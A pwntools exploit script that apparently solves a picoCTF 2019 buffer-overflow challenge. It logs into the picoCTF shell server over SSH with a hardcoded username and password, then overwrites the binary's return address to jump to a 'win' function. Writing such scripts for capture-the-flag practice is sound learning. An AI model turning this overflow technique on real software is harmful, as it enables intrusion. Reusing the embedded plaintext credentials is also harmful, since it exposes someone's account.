from pwn import *
import sys

argv = sys.argv

DEBUG = True
BINARY = './vuln'

context.binary = BINARY
context.terminal = ['tmux', 'splitw', '-v']

def attach_gdb():
  gdb.attach(sh)


# context.log_level = 'debug'

s = ssh(host='2019shell1.picoctf.com', user='kfukuta', password="qwe123qwe")
sh = s.process(['./vuln'], cwd='/problems/newoverflow-1_5_bd04c7682164df72135e036dd527b668')
REMOTE = True

import struct

win_addr = 0x00400767
main_addr = 0x004007e8
payload = b'a'*(0x40+8)+struct.pack("<Q", main_addr)+struct.pack("<Q", win_addr)

sh.sendlineafter('Welcome to 64-bit. Give me a string that gets you the flag: ', payload)

res = sh.recvall()
print(res)

# sh.interactive()
